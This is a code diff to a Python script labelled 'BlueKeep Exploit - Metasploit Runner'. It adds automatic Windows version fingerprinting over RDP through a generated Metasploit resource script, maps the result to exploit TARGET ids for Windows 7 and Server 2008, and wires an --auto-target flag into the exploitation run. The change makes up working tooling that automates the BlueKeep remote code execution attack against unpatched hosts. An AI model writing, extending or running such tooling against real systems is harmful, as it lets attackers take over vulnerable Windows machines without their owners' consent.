@@ -121,6 +121,81 @@ def run_vulnerability_scan(target_ip, target_port=3389, verbose=False):
             os.remove(scan_script_name)
         return None
 
+def detect_windows_version(target_ip, target_port=3389, verbose=False):
+    """
+    Detect the Windows version of the target using RDP fingerprinting.
+    Returns the appropriate TARGET ID for Metasploit.
+    """
+    print(f"[*] Attempting to detect Windows version on {target_ip}:{target_port}...")
+    
+    # Create a temporary resource script for OS detection
+    os_script_name = f"os_detect_{random.randint(1000, 9999)}.rc"
+    
+    with open(os_script_name, "w") as f:
+        f.write("use auxiliary/scanner/rdp/rdp_scanner\n")
+        f.write(f"set RHOSTS {target_ip}\n")
+        f.write(f"set RPORT {target_port}\n")
+        f.write("run\n")
+        f.write("exit\n")
+    
+    try:
+        print("[*] Running OS detection scan...")
+        cmd = ["msfconsole", "-q", "-r", os_script_name]
+        process = subprocess.run(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        
+        # Remove the resource script
+        if os.path.exists(os_script_name):
+            os.remove(os_script_name)
+        
+        # Check the output for OS information
+        output = process.stdout.lower()
+        if verbose:
+            print("[*] OS detection output:")
+            print(output)
+        
+        # Determine target ID based on detected OS
+        if "windows 7 sp1" in output or "6.1.7601" in output:
+            detected_os = "Windows 7 SP1"
+            target_id = 1
+        elif "windows 7" in output or "6.1.7600" in output:
+            detected_os = "Windows 7 SP0"
+            target_id = 2
+        elif "windows server 2008 r2 sp1" in output or "windows 2008 r2 sp1" in output:
+            detected_os = "Windows Server 2008 R2 SP1"
+            target_id = 3
+        elif "windows server 2008 r2" in output or "windows 2008 r2" in output:
+            detected_os = "Windows Server 2008 R2 SP0"
+            target_id = 4
+        elif "windows server 2008" in output or "windows 2008" in output:
+            detected_os = "Windows Server 2008 SP1"
+            target_id = 5
+        elif "windows" in output:
+            detected_os = "Windows (specific version not identified)"
+            target_id = 2  # Default to Windows 7 SP0
+        else:
+            detected_os = "Unknown (could not determine)"
+            target_id = 2  # Default to Windows 7 SP0
+        
+        print(f"[+] Detected: {detected_os} - using TARGET {target_id}")
+        
+        # Warning for Server 2008
+        if target_id in [3, 4, 5]:
+            print(f"[!] Warning: Windows Server 2008 targets require fDisableCam=0 registry setting!")
+        
+        return target_id
+        
+    except Exception as e:
+        print(f"[-] Error during OS detection: {e}")
+        print("[*] Using default TARGET 2 (Windows 7 SP0)")
+        if os.path.exists(os_script_name):
+            os.remove(os_script_name)
+        return 2
+
 def parse_arguments():
     parser = argparse.ArgumentParser(description="BlueKeep Exploit - Metasploit Runner")
     parser.add_argument("-i", "--rhost", required=True, help="Target IP address")
@@ -137,6 +212,8 @@ def parse_arguments():
     parser.add_argument("-d", "--debug", action="store_true", help="Debug mode: Show extra diagnostic information")
     parser.add_argument("-s", "--scan", action="store_true", help="Scan target for vulnerability before exploitation")
     parser.add_argument("--scan-only", action="store_true", help="Only scan for vulnerability, don't exploit")
+    parser.add_argument("-A", "--auto-target", action="store_true", 
+                      help="Automatically detect OS version and select appropriate target")
     return parser.parse_args()
 
 def main():
@@ -189,6 +266,13 @@ def main():
         except:
             print("[-] Failed to auto-detect local IP. Please specify with -l/--lhost")
             sys.exit(1)
+    
+    # Auto-detect target OS if requested
+    if args.auto_target:
+        print("[*] Auto-target mode enabled")
+        detected_target = detect_windows_version(args.rhost, args.rport, args.verbose)
+        args.target = detected_target
+        print(f"[*] Using detected TARGET ID: {args.target}")
     
     # Display configuration
     print(f"[*] Target: {args.rhost}:{args.rport}")
